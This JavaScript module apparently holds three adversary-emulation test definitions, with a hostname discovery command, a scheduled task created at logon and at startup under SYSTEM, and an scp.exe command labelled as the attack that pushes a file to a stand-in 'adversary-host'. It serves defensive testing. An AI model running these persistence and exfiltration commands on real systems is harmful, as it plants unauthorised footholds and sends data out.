const basic = {
    "name": "Hostname Discovery (Windows)",
    "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
    "supported_platforms": [
        "windows"
    ],
    "input_arguments": [],
    "dependency_executor_name": null,
    "dependencies": [],
    "executor": {
        "command": "hostname\n",
        "cleanup_command": null,
        "name": "command prompt",
        "elevation_required": false
    }
};

const moderate = {
    "name": "Scheduled Task Startup Script",
    "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view the tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
    "supported_platforms": [
        "windows"
    ],
    "input_arguments": [],
    "dependency_executor_name": null,
    "dependencies": [],
    "executor": {
        "command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n",
        "cleanup_command": "schtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1\nschtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1\n",
        "name": "command prompt",
        "elevation_required": true
    }
}

const complex = {
    "name": "Windows push file using scp.exe",
    "description": "This test simulates pushing files using SCP on a Windows environment.\n",
    "supported_platforms": [
        "windows"
    ],
    "input_arguments": [
        {
            "description": "User account to authenticate on remote host",
            "default": "adversary",
            "type": "string",
            "name": "username"
        },
        {
            "description": "Name of the file to transfer",
            "default": "T1105.txt",
            "type": "string",
            "name": "file_name"
        },
        {
            "description": "Local path to copy from",
            "default": "C:\\temp",
            "type": "path",
            "name": "local_path"
        },
        {
            "description": "Remote host to send",
            "default": "adversary-host",
            "type": "string",
            "name": "remote_host"
        },
        {
            "description": "Path of folder to copy",
            "default": "/tmp/",
            "type": "path",
            "name": "remote_path"
        }
    ],
    "dependency_executor_name": "powershell",
    "dependencies": [
        {
            "description": "This test requires the `scp` command to be available on the system.",
            "prereq_command": "if (Get-Command scp -ErrorAction SilentlyContinue) {\n    Write-Output \"SCP command is available.\"\n    exit 0\n} else {\n    Write-Output \"SCP command is not available.\"\n    exit 1\n}\n",
            "get_prereq_command": "# Define the capability name for OpenSSH Client\n$capabilityName = \"OpenSSH.Client~~~~0.0.1.0\"\ntry {\n    # Install the OpenSSH Client capability\n    Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop\n    Write-Host \"OpenSSH Client has been successfully installed.\" -ForegroundColor Green\n} catch {\n    # Handle any errors that occur during the installation process\n    Write-Host \"An error occurred while installing OpenSSH Client: $_\" -ForegroundColor Red\n}\n"
        }
    ],
    "executor": {
        "command": "# Check if the folder exists, create it if it doesn't\n$folderPath = \"#{local_path}\"\nif (-Not (Test-Path -Path $folderPath)) {\n  New-Item -Path $folderPath -ItemType Directory\n}\n\n# Create the file\n$filePath = Join-Path -Path $folderPath -ChildPath \"#{file_name}\"\nNew-Item -Path $filePath -ItemType File -Force\nWrite-Output \"File created: $filePath\"\n\n# Attack command\nscp.exe #{local_path}\\#{file_name} #{username}@#{remote_host}:#{remote_path}\n",
        "cleanup_command": "$filePath = Join-Path -Path \"#{local_path}\" -ChildPath \"#{file_name}\"\nRemove-Item -Path $filePath -Force -erroraction silentlycontinue\nWrite-Output \"File deleted: $filePath\"\n",
        "name": "powershell",
        "elevation_required": true
    }
};

export { basic, moderate, complex };